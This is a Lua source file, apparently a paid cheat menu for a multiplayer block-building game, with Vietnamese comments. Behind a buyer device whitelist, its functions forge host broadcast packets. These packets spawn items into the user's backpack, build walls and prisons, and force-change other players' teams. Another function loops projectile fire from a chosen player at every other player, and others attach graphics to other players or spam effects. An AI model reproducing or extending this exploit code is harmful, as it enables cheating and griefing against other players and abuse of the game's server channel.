        return
    end

    -- Đóng ngay bảng menu giao diện khi ấn vào nút chức năng
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- BẢNG 1: Nhập kích thước vùng
    ShowGameTipsWithoutFilter("Vui lòng nhập: Kích thước vùng")
    ShowTextInputSafe(function(sizeText)
        if not sizeText or sizeText == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập kích thước hợp lệ")
            return
        end

        local platform_size = tonumber(sizeText)
        if not platform_size or platform_size <= 0 then
            ShowGameTipsWithoutFilter("Kích thước phải là một con số lớn hơn 0")
            return
        end

        -- BẢNG 2: Nhập độ cao / Số lớp chiều cao (Ví dụ nhập 3 sẽ tạo 3 tầng khối)
        ShowGameTipsWithoutFilter("Vui lòng nhập: Số lớp độ cao (Ví dụ: 3 lớp khối)")
        ShowTextInputSafe(function(heightText)
            if not heightText or heightText == "" then
                ShowGameTipsWithoutFilter("Vui lòng nhập độ cao hợp lệ")
                return
            end

            local inputHeight = tonumber(heightText)
            if not inputHeight or inputHeight <= 0 then
                ShowGameTipsWithoutFilter("Độ cao phải là một con số lớn hơn 0")
                return
            end

            -- BẢNG 3: Nhập ID khối
            ShowGameTipsWithoutFilter("Vui lòng nhập: ID khối")
            ShowTextInputSafe(function(idText)
                if not idText or idText == "" then
                    ShowGameTipsWithoutFilter("Vui lòng nhập ID khối hợp lệ")
                    return
                end

                local blockId = tonumber(idText)
                if not blockId then
                    ShowGameTipsWithoutFilter("ID khối phải là một con số")
                    return
                end

                -- BẢNG 4: Hộp thoại Yes/No xác nhận đồng ý hoặc hủy
                GetInst("MessageBoxInterface"):dualBtnBox(
                    "Xác nhận tạo vùng với kích thước " .. platform_size .. "x" .. platform_size .. " (Số lớp độ cao: " .. inputHeight .. " | ID: " .. blockId .. ")?",
                    "Hủy",
                    "Đồng ý",
                    function(userData, btnType)
                        -- btnType == 0 là nút trái (Hủy), btnType == 1 là nút phải (Đồng ý)
                        if btnType == 1 then
                            local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                            local base_x, base_y, base_z = math.floor(x / 100), math.floor(y / 100), math.floor(z / 100)

                            local half_size = math.floor(platform_size / 2)

                            -- Chạy ngầm để tạo khối (lặp qua diện tích và lặp qua từng lớp chiều cao)
                            threadpool:work(function()
                                for h = 0, inputHeight - 1 do
                                    local current_y = base_y + h
                                    for dx = -half_size, half_size - 1 do
                                        for dz = -half_size, half_size - 1 do
                                            local current_x = base_x + dx
                                            local current_z = base_z + dz
                                            local tdata = {
                                                [1] = "block",
                                                [2] = "placeBlock",
                                                [3] = { blockId, current_x, current_y, current_z, 0, -1 }
                                            }
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        end
                                    end
                                end

                                ShowGameTipsWithoutFilter("#c00ff00Đã tạo " .. inputHeight .. " lớp khối kích thước " .. platform_size .. "x" .. platform_size .. " thành công!")
                            end)
                        else
                            ShowGameTipsWithoutFilter("#cFF0000Đã hủy thao tác!")
                        end
                    end
                )
            end)
        end)
    end)
end

function pcty3()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra quyền hạn thiết bị
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
        return
    end

    -- Đóng ngay bảng menu giao diện khi ấn vào nút chức năng
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Bước 1: Hiện bảng nhập ID vật phẩm
    ShowGameTipsWithoutFilter("Vui lòng nhập: ID vật phẩm")
    ShowTextInputSafe(function(idText)
        if not idText or idText == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập ID hợp lệ")
            return
        end

        local itemId = tonumber(idText)
        if not itemId or itemId <= 0 then
            ShowGameTipsWithoutFilter("ID vật phẩm phải là một con số lớn hơn 0")
            return
        end

        -- Bước 2: Hiện bảng nhập Số lượng
        ShowGameTipsWithoutFilter("Vui lòng nhập: Số lượng muốn thêm")
        ShowTextInputSafe(function(countText)
            if not countText or countText == "" then
                ShowGameTipsWithoutFilter("Vui lòng nhập số lượng hợp lệ")
                return
            end

            local itemCount = tonumber(countText)
            if not itemCount or itemCount <= 0 then
                ShowGameTipsWithoutFilter("Số lượng phải là một con số lớn hơn 0")
                return
            end

            -- Lấy UIN của người chơi hiện tại
            local uin = AccountManager:getUin()

            -- Gửi gói tin thêm vật phẩm vào ba lô qua broadcast
            local tdata = {
                [1] = "backpack",
                [2] = "addItem",
                [3] = { uin, itemId, itemCount }
            }
            
            pcall(function()
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end)

            ShowGameTipsWithoutFilter(string.format("Thêm vật phẩm ID: %d | Số lượng: %d", itemId, itemCount))
        end)
    end)
end

function pcty4()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra quyền hạn thiết bị
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
        return
    end

    -- Đóng giao diện menu khi ấn
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- BẢNG 1: Nhập kích thước (Size) cho nhà tù
    ShowGameTipsWithoutFilter("Vui lòng nhập: Kích thước nhà tù (Ví dụ: 15)")
    ShowTextInputSafe(function(sizeText)
        if not sizeText or sizeText == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập kích thước hợp lệ")
            return
        end

        local prisonSize = tonumber(sizeText)
        if not prisonSize or prisonSize < 5 then
            ShowGameTipsWithoutFilter("Kích thước phải là một số lớn hơn hoặc bằng 5")
            return
        end

        -- BẢNG 2: Nhập chiều cao (Height) cho nhà tù
        ShowGameTipsWithoutFilter("Vui lòng nhập: Chiều cao nhà tù (Ví dụ: 8)")
        ShowTextInputSafe(function(heightText)
            if not heightText or heightText == "" then
                ShowGameTipsWithoutFilter("Vui lòng nhập chiều cao hợp lệ")
                return
            end

            local height = tonumber(heightText)
            if not height or height < 3 then
                ShowGameTipsWithoutFilter("Chiều cao phải là một số lớn hơn hoặc bằng 3")
                return
            end

            -- BẢNG 3: Hộp thoại xác nhận Yes/No (Đồng ý / Hủy)
            GetInst("MessageBoxInterface"):dualBtnBox(
                "Xác nhận tạo nhà tù bao quanh bạn với kích thước " .. prisonSize .. "x" .. height .. "x" .. prisonSize .. "?",
                "Hủy",
                "Đồng ý",
                function(userData, btnType)
                    -- btnType == 1 là nút Đồng ý, btnType == 0/khác là nút Hủy
                    if btnType == 1 then
                        -- Lấy tọa độ nhân vật hiện tại
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                        local base_x, base_y, base_z = math.floor(x / 100), math.floor(y / 100), math.floor(z / 100)

                        -- Tính toán tọa độ bắt đầu để tâm nhà tù nằm chính giữa nhân vật
                        local half_size = math.floor(prisonSize / 2)
                        local start_x = base_x - half_size
                        local start_y = base_y - 1  -- Bắt đầu từ dưới chân nhân vật 1 block
                        local start_z = base_z - half_size

                        ShowGameTipsWithoutFilter("#c00ff00Đang tạo nhà tù kích thước " .. prisonSize .. "x" .. height .. "x" .. prisonSize .. "...")

                        -- Chạy ngầm để tạo khối tránh giật game
                        threadpool:work(function()
                            -- Tạo tường và sàn
                            for dx = 0, prisonSize - 1 do
                                for dy = 0, height - 1 do
                                    for dz = 0, prisonSize - 1 do
                                        local isWall = (dx == 0 or dx == prisonSize - 1 or  
                                                         dz == 0 or dz == prisonSize - 1 or  
                                                         dy == 0)                         

                                        if isWall and dy < height - 1 then  
                                            local current_x = start_x + dx
                                            local current_y = start_y + dy
                                            local current_z = start_z + dz

                                            local tdata = {
                                                [1] = "block",
                                                [2] = "placeBlock",
                                                [3] = { 1, current_x, current_y, current_z, 0, -1 } -- ID khối 1
                                            }
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        end
                                    end
                                end
                            end

                            -- Đặt khối không khí ở phía trên (trần trống)
                            local top_y = start_y + height - 1
                            for dx = 0, prisonSize - 1 do
                                for dz = 0, prisonSize - 1 do
                                    local current_x = start_x + dx
                                    local current_z = start_z + dz

                                    local air_data = {
                                        [1] = "block",
                                        [2] = "placeBlock",
                                        [3] = { 1001, current_x, top_y, current_z, 0, -1 } -- ID 1001 là không khí
                                    }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, air_data)
                                end
                            end

                            ShowGameTipsWithoutFilter("#c00ffffTạo nhà tù bao quanh nhân vật thành công!")
                        end)
                    else
                        ShowGameTipsWithoutFilter("#cFF0000Đã hủy thao tác tạo nhà tù!")
                    end
                end
            )
        end)
    end)
end

function pcty5()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra quyền hạn thiết bị
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
        return
    end

    -- Đóng giao diện menu khi ấn
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Bước 1: Mở bảng chọn người chơi
    ShowPlayerList(function(selectedUin)
        if not selectedUin then
            ShowGameTipsWithoutFilter("#RĐã hủy chọn người chơi")
            return
        end

        -- Bước 2: Hiển thị bảng nhập ID đội mới
        ShowGameTipsWithoutFilter("Vui lòng nhập: ID đội mới (Số)")
        ShowTextInputSafe(function(text)
            if not text or text == "" then
                ShowGameTipsWithoutFilter("Vui lòng nhập ID đội hợp lệ")
                return
            end

            local teamId = tonumber(text)
            if not teamId then
                ShowGameTipsWithoutFilter("ID đội phải là một con số")
                return
            end

            -- Bước 3: Gửi gói tin đổi đội cho người chơi được chọn
            local tdata = {
                [1] = "team",
                [2] = "changePlayerTeam",
                [3] = { selectedUin, teamId }
            }

            pcall(function()
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end)

            ShowGameTipsWithoutFilter(string.format("#c00ff00Đã đổi đội cho người chơi sang đội: %d", teamId))
        end)
    end, "选择要 đổi đội的目标")
end

function pcty6()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra quyền hạn thiết bị
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
        return
    end

    -- Đóng giao diện menu khi ấn
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Hiển thị bảng nhập ID đội mới cho toàn bộ người chơi
    ShowGameTipsWithoutFilter("Vui lòng nhập: ID đội mới cho TOÀN BỘ người chơi")
    ShowTextInputSafe(function(text)
        if not text or text == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập ID đội hợp lệ")
            return
        end

        local teamId = tonumber(text)
        if not teamId then
            ShowGameTipsWithoutFilter("ID đội phải là một con số")
            return
        end

        -- Hộp thoại xác nhận Yes/No (Đồng ý / Hủy)
        GetInst("MessageBoxInterface"):dualBtnBox(
            "Xác nhận đổi TOÀN BỘ người chơi trong game sang đội ID: " .. teamId .. "?",
            "Hủy",
            "Đồng ý",
            function(userData, btnType)
                -- btnType == 1 là nút Đồng ý, btnType == 0/khác là nút Hủy
                if btnType == 1 then
                    -- Chạy ngầm để quét và đổi đội toàn bộ người chơi tránh lag game
                    threadpool:work(function()
                        local ok, playerCount = pcall(function()
                            return ClientCurGame:requireArrayOfAllPlayers()
                        end)

                        if ok and type(playerCount) == "number" then
                            local count = 0
                            for i = 1, playerCount do
                                local p = ClientCurGame:getIthPlayerInArray(i - 1)
                                if p then
                                    local uin = p:getUin()
                                    local tdata = {
                                        [1] = "team",
                                        [2] = "changePlayerTeam",
                                        [3] = { uin, teamId }
                                    }
                                    pcall(function()
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                    end)
                                    count = count + 1
                                end
                            end
                            ShowGameTipsWithoutFilter(string.format("#c00ff00Đã đổi toàn bộ %d người chơi sang đội: %d", count, teamId))
                        else
                            ShowGameTipsWithoutFilter("#RKhông thể lấy danh sách người chơi!")
                        end
                    end)
                else
                    ShowGameTipsWithoutFilter("#cFF0000Đã hủy thao tác đổi đội!")
                end
            end
        )
    end)
end

function pcty7()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra quyền hạn thiết bị
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
        return
    end

    -- Đóng giao diện menu khi ấn
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- BẢNG 1: Nhập ID khối
    ShowGameTipsWithoutFilter("Vui lòng nhập: ID khối muốn tạo 11 vòng")
    ShowTextInputSafe(function(idText)
        if not idText or idText == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập ID hợp lệ")
            return
        end

        local customBlockId = tonumber(idText)
        if not customBlockId then
            ShowGameTipsWithoutFilter("ID khối phải là một con số")
            return
        end

        -- Lấy tên vật phẩm / khối từ cơ sở dữ liệu game
        local blockName = "Khối không rõ"
        pcall(function()
            local def = ItemDefCsv:get(customBlockId)
            if def and def.Name then
                blockName = def.Name
            end
        end)

        -- BẢNG 2: Nhập chiều cao bắt đầu (Min Height)
        ShowGameTipsWithoutFilter("Vui lòng nhập: Chiều cao BẮT ĐẦU (Ví dụ: 0 ở chân, -5 ở dưới đất)")
        ShowTextInputSafe(function(minHeightText)
            if not minHeightText or minHeightText == "" then
                ShowGameTipsWithoutFilter("Vui lòng nhập chiều cao bắt đầu hợp lệ")
                return
            end

            local minHeight = tonumber(minHeightText)
            if not minHeight then
                ShowGameTipsWithoutFilter("Chiều cao phải là một con số")
                return
            end

            -- BẢNG 3: Nhập chiều cao kết thúc (Max Height)
            ShowGameTipsWithoutFilter("Vui lòng nhập: Chiều cao KẾT THÚC (Ví dụ: 10 trên đầu, tạo trụ cao lên)")
            ShowTextInputSafe(function(maxHeightText)
                if not maxHeightText or maxHeightText == "" then
                    ShowGameTipsWithoutFilter("Vui lòng nhập chiều cao kết thúc hợp lệ")
                    return
                end

                local maxHeight = tonumber(maxHeightText)
                if not maxHeight then
                    ShowGameTipsWithoutFilter("Chiều cao phải là một con số")
                    return
                end

                if maxHeight < minHeight then
                    ShowGameTipsWithoutFilter("Chiều cao kết thúc phải lớn hơn hoặc bằng chiều cao bắt đầu!")
                    return
                end

                -- Tính số lượng khối cho từng vòng
                local tempCounts = {
                    math.floor(2 * math.pi * 5 * 0.8),
                    math.floor(2 * math.pi * 10 * 0.8),
                    math.floor(2 * math.pi * 15 * 0.8),
                    math.floor(2 * math.pi * 20 * 0.8),
                    math.floor(2 * math.pi * 25 * 0.8),
                    math.floor(2 * math.pi * 30 * 0.8),
                    math.floor(2 * math.pi * 35 * 0.8),
                    math.floor(2 * math.pi * 40 * 0.8),
                    math.floor(2 * math.pi * 45 * 0.8),
                    math.floor(2 * math.pi * 60 * 0.8),
                    math.floor(2 * math.pi * 75 * 0.8)
                }
                
                local blocksPerLayer = 0
                for _, c in ipairs(tempCounts) do blocksPerLayer = blocksPerLayer + c end
                
                local totalHeightLevels = (maxHeight - minHeight) + 1
                local totalBlocks = blocksPerLayer * totalHeightLevels

                -- BẢNG 4: Hộp thoại xác nhận Yes/No
                GetInst("MessageBoxInterface"):dualBtnBox(
                    string.format("Xác nhận tạo 11 tầng vòng bằng [%s] (ID: %d | Cao từ %d đến %d | ~%d khối)?", blockName, customBlockId, minHeight, maxHeight, totalBlocks),
                    "Hủy",
                    "Đồng ý",
                    function(userData, btnType)
                        if btnType == 1 then
                            local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                            local center_x, center_y, center_z = x / 100, y / 100, z / 100
                            
                            local radius = {5.0, 10.0, 15.0, 20.0, 25.0, 30.0, 35.0, 40.0, 45.0, 60.0, 75.0}
                            local flowerCount = tempCounts
                            
                            ShowGameTipsWithoutFilter(string.format("#c00ff00Bắt đầu dựng vòng từ độ cao %d đến %d...", minHeight, maxHeight))
                            
                            -- Chạy luồng ngầm dựng từng tầng vòng khép kín
                            threadpool:work(function()
                                for h = minHeight, maxHeight do
                                    local current_y = center_y + h
                                    
                                    for layer = 1, 11 do
                                        local currentRadius = radius[layer]
                                        local currentCount = flowerCount[layer]
                                        
                                        ShowGameTipsWithoutFilter(string.format("#cFFAA00Đang tạo Cao: %d | Vòng bán kính %.1fm", h, currentRadius))
                                        
                                        -- Vẽ trọn vẹn 1 vòng tròn khép kín ở độ cao hiện tại
                                        for i = 1, currentCount do
                                            local angle = (i - 1) * (2 * math.pi / currentCount)
                                            
                                            local rand_angle = (math.random() - 0.5) * 0.1
                                            local rand_radius = (math.random() - 0.5) * 0.3
                                            local final_angle = angle + rand_angle
                                            local final_radius = currentRadius + rand_radius
                                            
                                            local offset_x = math.cos(final_angle) * final_radius
                                            local offset_z = math.sin(final_angle) * final_radius
                                            
                                            local flower_x = center_x + offset_x
                                            local flower_z = center_z + offset_z
                                            
                                            local tdata = {
                                                [1] = "block",
                                                [2] = "placeBlock",
                                                [3] = { customBlockId, flower_x, current_y, flower_z, 0, -1 }
                                            }
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            
                                            threadpool:wait(0.001)
                                        end
                                        -- Nghỉ ngắn giữa các vòng bán kính khác nhau để tránh quá tải
                                        threadpool:wait(0.02)
                                    end
                                end
                                ShowGameTipsWithoutFilter("#c00ff00Đã hoàn tất toàn bộ các vòng cấu trúc!")
                            end)
                        else
                            ShowGameTipsWithoutFilter("#cFF0000Đã hủy thao tác!")
                        end
                    end
                )
            end)
        end)
    end)
end

function pcty8()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng hay không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hộp thoại lựa chọn Bật / Tắt (Bên trái: Tắt, Bên phải: Bật)
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Nhập id để bắn vật ném hướng về mục tiêu\nDừng lại ở bên trái\nBắt đầu từ bên phải",
        "关闭",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                -- Nút TẮT (Bên trái) -> Dừng vòng lặp tự động bắn
                _G.auto_shoot_enabled = false
                ShowGameTipsWithoutFilter("#cff0000Đã TẮT Tự Động Bắn!")
                
            elseif btnType == 1 then
                -- Nút BẬT (Bên phải) -> Bước 1: Hiển thị danh sách chọn người chơi sẽ làm người bắn
                ShowPlayerList(function(shooterUin)
                    if not shooterUin then
                        ShowGameTipsWithoutFilter("#RĐã hủy chọn người chơi bắn")
                        return
                    end

                    -- Bước 2: Hiển thị bảng nhập ID vật ném sau khi đã chọn được người chơi bắn
                    ShowTextInputSafe(function(text)
                        if not text or text == "" then
                            ShowGameTipsWithoutFilter("Vui lòng nhập ID vật phẩm có thể ném hợp lệ")
                            return
                        end

                        local projectileId = tonumber(text)
                        if not projectileId then
                            ShowGameTipsWithoutFilter("ID của vật thể ném được phải là một con số")
                            return
                        end

                        _G.auto_shoot_generation = (_G.auto_shoot_generation or 0) + 1
                        local currentGeneration = _G.auto_shoot_generation
                        _G.auto_shoot_enabled = true

                        -- Mở luồng chạy ngầm bằng threadpool
                        threadpool:work(function()
                            ShowGameTipsWithoutFilter("#c00ffffĐã BẬT Tự Động Bắn cho người chơi được chọn! ID vật ném: " .. projectileId)

                            while _G.auto_shoot_enabled and currentGeneration == _G.auto_shoot_generation do
                                local ok, playerCount = pcall(function()
                                    return ClientCurGame:requireArrayOfAllPlayers()
                                end)

                                if ok and type(playerCount) == "number" then
                                    -- Tìm đối tượng người chơi được chọn để lấy tọa độ xuất phát của họ
                                    local shooterPlayer = nil
                                    for i = 1, playerCount do
                                        local p = ClientCurGame:getIthPlayerInArray(i - 1)
                                        if p and p:getUin() == shooterUin then
                                            shooterPlayer = p
                                            break
                                        end
                                    end

                                    -- Nếu người chơi bắn đã rời trận thì dừng
                                    if not shooterPlayer then
                                        ShowGameTipsWithoutFilter("#cff0000Người chơi bắn đã rời trận, dừng tự động bắn!")
                                        _G.auto_shoot_enabled = false
                                        break
                                    end

                                    -- Lấy tọa độ của người chơi bắn
                                    local shooterPosOk, rawShooterX, rawShooterY, rawShooterZ = pcall(function()
                                        return shooterPlayer:getPosition(0, 0, 0)
                                    end)

                                    if shooterPosOk and rawShooterX and rawShooterY and rawShooterZ then
                                        local shooter_x = rawShooterX / 100
                                        local shooter_y = rawShooterY / 100
                                        local shooter_z = rawShooterZ / 100

                                        -- Vòng lặp quét qua các mục tiêu khác để bắn tới
                                        for i = 1, playerCount do
                                            if not _G.auto_shoot_enabled or currentGeneration ~= _G.auto_shoot_generation then break end

                                            local player = ClientCurGame:getIthPlayerInArray(i - 1)

                                            if player then
                                                local targetUin = player:getUin()
                                                
                                                -- KIỂM TRA: Không phải chính người chơi đang bắn VÀ KHÔNG nằm trong danh sách trắng chung
                                                if targetUin and targetUin ~= shooterUin and not (whitelist and whitelist[targetUin]) then

                                                    local posOk, rawX, rawY, rawZ = pcall(function()
                                                        return player:getPosition(0, 0, 0)
                                                    end)

                                                    if posOk and rawX and rawY and rawZ then
                                                        local target_x = rawX / 100
                                                        local target_y = rawY / 100
                                                        local target_z = rawZ / 100

                                                        local tdata = {
                                                            [1] = "world",
                                                            [2] = "spawnProjectile",
                                                            [3] = {
                                                                shooterUin, -- Dùng UIN của người được chọn làm người xuất chiêu
                                                                projectileId,

                                                                shooter_x,
                                                                shooter_y + 2,
                                                                shooter_z,

                                                                target_x,
                                                                target_y,
                                                                target_z,

                                                                500
                                                            }
                                                        }

                                                        pcall(function()
                                                            ScriptSupportTask:reportTaskToHost(
                                                                SSTASKID.HOST_BordCast,
                                                                tdata
                                                            )
                                                        end)
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end

                                -- Thời gian chờ giữa các lần xả đạn (0.1 giây)
                                threadpool:wait(0.1)
                            end
                        end)
                    end, "Nhập ID vật ném")
                end, "Chọn người chơi làm người bắn")
            end
        end
    )
end

function pcty9()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng hay không (nếu có hệ thống auth)
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    -- Đóng giao diện menu khi ấn
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Hiển thị bảng Yes / No (Xác nhận đổi tên bản thân)
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Bạn có muốn đổi tên hiển thị của bản thân không?",
        "Hủy",
        "Đồng ý",
        function(userData, btnType)
            -- btnType == 1 tương ứng với nút "Đồng ý" (Bên phải)
            if btnType == 1 then
                -- Bước 1: Mở bảng nhập chữ để bạn gõ tên mới cho bản thân
                ShowTextInputSafe(function(text)
                    if not text or text == "" then
                        ShowGameTipsWithoutFilter("Vui lòng nhập biệt danh hợp lệ.")
                        return
                    end
                    
                    -- Lấy UIN của chính bản thân người chơi
                    local myUin = nil
                    pcall(function()
                        if AccountManager and AccountManager.getUin then
                            myUin = AccountManager:getUin()
                        end
                    end)

                    if not myUin then
                        ShowGameTipsWithoutFilter("Không thể xác định UIN của bạn.")
                        return
                    end

                    -- Lấy tên cũ của bản thân để hiển thị thông báo
                    local oldName = "Không rõ tên"
                    pcall(function()
                        if ClientCurGame and ClientCurGame.getPlayerByUin then
                            local playerObj = ClientCurGame:getPlayerByUin(myUin)
                            if playerObj and playerObj.getNickName then
                                oldName = playerObj:getNickName()
                            end
                        end
                    end)

                    -- Gói tin đổi tên cho chính bản thân
                    local tdata = {
                        [1] = "actor",
                        [2] = "setnickname",
                        [3] = {
                            myUin,  -- UIN của chính bạn
                            text    -- Tên mới đã nhập từ bước đầu tiên
                        }
                    }
                    
                    pcall(function()
                        if ScriptSupportTask and SSTASKID then
                            ScriptSupportTask:reportTaskToHost(
                                SSTASKID.HOST_BordCast,
                                tdata
                            )
                        end
                    end)
                    
                    -- Thông báo thành công
                    ShowGameTipsWithoutFilter(string.format("#c00ffffĐã đổi tên của bạn (%s) thành: %s", tostring(oldName), tostring(text)))
                end, "Nhập tên mới cho bản thân")
            else
                ShowGameTipsWithoutFilter("#cFF0000Đã hủy thao tác!")
            end
        end
    )
end

function pcty10()
    -- 1. Đóng giao diện menu
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- 2. Hiển thị bảng xác nhận Yes / No
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Bạn có muốn tạo hiệu ứng ảnh và danh hiệu cho người chơi không?",
        "Hủy",
        "Đồng ý",
        function(userData, btnType)
            -- btnType == 1 tương ứng với nút "Đồng ý" (Bên phải)
            if btnType == 1 then
                
                -- 3. Bảng nhập văn bản (Tiêu đề / Danh hiệu)
                ShowTextInputSafe(function(textInput)
                    if not textInput or textInput == "" then
                        ShowGameTipsWithoutFilter("Vui lòng nhập nội dung văn bản hợp lệ.")
                        return
                    end
                    
                    local customTitle = textInput

                    -- 4. Bảng nhập ID Icon (Hình ảnh)
                    ShowTextInputSafe(function(iconInput)
                        if not iconInput or iconInput == "" then
                            ShowGameTipsWithoutFilter("Vui lòng nhập ID Icon hợp lệ.")
                            return
                        end

                        local imgIdNum = tonumber(iconInput)
                        if not imgIdNum then
                            ShowGameTipsWithoutFilter("ID Icon phải là một con số.")
                            return
                        end

                        -- 5. Bảng chọn người chơi
                        ShowPlayerList(function(selectedUin)
                            if not selectedUin then
                                ShowGameTipsWithoutFilter("#RĐã hủy chọn người chơi")
                                return
                            end

                            -- Sử dụng trực tiếp UIN được chọn
                            local targetUin = selectedUin

                            -- ========================================================
                            -- TẠO HÌNH ẢNH HIỆU ỨNG (Ở ĐỘ CAO Y = 50)
                            -- ========================================================
                            local imageDir = { x = 0, y = 50, z = 0 }

                            local graphicsImageInfo = {
                                imgid = imgIdNum,
                                scale = 0.7,
                                apha = 90,
                                id = 1,
                                Type = 'GRAPHICS.GRAPHICS_IMAGE'
                            }

                            local tdataImage = {
                                [1] = "graphics",
                                [2] = "createGraphicsImageByActor",
                                [3] = {
                                    targetUin,
                                    graphicsImageInfo,
                                    imageDir,
                                    1,
                                    0,
                                    150
                                }
                            }

                            -- ========================================================
                            -- TẠO TÊN HIỂN THỊ (ĐẶT Y = 30)
                            -- ========================================================
                            local textDir = { x = 0, y = 30, z = 0 }
                            local textOffset = 10
                            local textX2, textY2 = 0, 0

                            local graphicsInfo = {
                                apha = 1,
                                Type = 1,
                                title = customTitle,
                                autoWrap = 2,
                                itype = 1,
                                fontsize = 100
                            }

                            local tdataText = {
                                [1] = "graphics",
                                [2] = "createGraphicsTxtByActor",
                                [3] = {
                                    targetUin,
                                    graphicsInfo,
                                    textDir,
                                    textOffset,
                                    textX2,
                                    textY2
                                }
                            }

                            -- ========================================================
                            -- GỬI LỆNH LÊN SERVER
                            -- ========================================================
                            pcall(function()
                                -- Gửi tạo ảnh
                                ScriptSupportTask:reportTaskToHost(
                                    SSTASKID.HOST_BordCast,
                                    tdataImage
                                )
                                -- Gửi tạo chữ
                                ScriptSupportTask:reportTaskToHost(
                                    SSTASKID.HOST_BordCast,
                                    tdataText
                                )
                            end)

                            ShowGameTipsWithoutFilter("#c00ffffĐã tạo hiệu ứng và danh hiệu thành công cho người chơi!")
                        end, "Chọn người chơi nhận hiệu ứng")

                    end, "Nhập ID Icon hình ảnh")

                end, "Nhập nội dung danh hiệu")

            else
                ShowGameTipsWithoutFilter("#cFF0000Đã hủy thao tác!")
            end
        end
    )
end

function pcty11()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra quyền hạn thiết bị
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
        return
    end

    -- Đóng giao diện menu khi ấn
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Hộp thoại lựa chọn: Đồng ý để BẬT, Hủy để DỪNG
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Trái: Dừng hiệu ứng\nPhải: Bật chuỗi hiệu ứng nhân vật",
        "Hủy (Dừng)",
        "Đồng ý (Chạy)",
        function(userData, btnType)
            if btnType == 1 then
                -- Nếu đang chạy rồi thì không bật chồng lên nữa
                if _G.zstx_running then
                    ShowGameTipsWithoutFilter("#cFFFF00Hiệu ứng đang chạy rồi!")
                    return
                end

                _G.zstx_running = true
                ShowGameTipsWithoutFilter("#c00ff00Đã bắt đầu chạy hiệu ứng!")
                
                -- Chạy ngầm vòng lặp
                threadpool:work(function()
                    for a = 0, 100000 do
                        -- Kiểm tra nếu người dùng bấm dừng thì ngắt vòng lặp ngay lập tức
                        if not _G.zstx_running then
                            break
                        end

                        threadpool:wait(0.1)

                        for i = 1, #commonNameList do
                            if not _G.zstx_running then break end
                            
                            local tdata = {
                                [1] = "actor",
                                [2] = "playBodyEffectByFile",
                                [3] = { AccountManager:getUin(), commonNameList[i], true }
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                            end)
                        end
                    end
                    _G.zstx_running = false
                end)
            else
                -- Nút Hủy -> Dừng vòng lặp
                _G.zstx_running = false
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng chuỗi hiệu ứng!")
            end
        end
    )
end

